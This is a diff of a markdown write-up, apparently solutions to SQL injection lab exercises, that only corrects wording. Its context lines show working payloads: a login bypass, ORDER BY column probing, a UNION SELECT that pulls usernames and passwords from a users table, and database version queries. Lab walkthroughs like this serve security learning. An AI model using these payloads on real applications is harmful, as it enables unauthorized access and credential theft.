@@ -35,7 +35,7 @@ Payload → `administrator'-- -`
 
 ## SQL injection UNION attack, determining the number of columns returned by the query
 
-First we have to find how many columns are there. We can use the [ORDER BY]() keyword. Lets increase the payload by 1 until we get and error.
+First we have to find how many columns are there. We can use the [ORDER BY]() keyword. Lets increase the payload number by 1 until we get an error.
 
 Payload → `'ORDER BY 3--`
 
@@ -94,7 +94,7 @@ Payload → `' UNION SELECT NULL,CONCAT(username,' ',password) FROM users--`
 
 ## SQL injection attack, querying the database type and version on Oracle
 
-For Oracle database we can get [banner]() from [v$version]() table to get the version.
+For Oracle database we can get [banner]() from [v$version]() table to get version information.
 
 Payload → `' UNION SELECT banner,NULL FROM v$version--`
 
@@ -104,7 +104,7 @@ Payload → `' UNION SELECT banner,NULL FROM v$version--`
 
 ## SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-To get MySQL or Microsoft database version we can use [@@version]()
+To get MySQL or Microsoft database version we can use [@@version]() keyword.
 
 Payload → `' UNION SELECT @@version,NULL-- -`
 
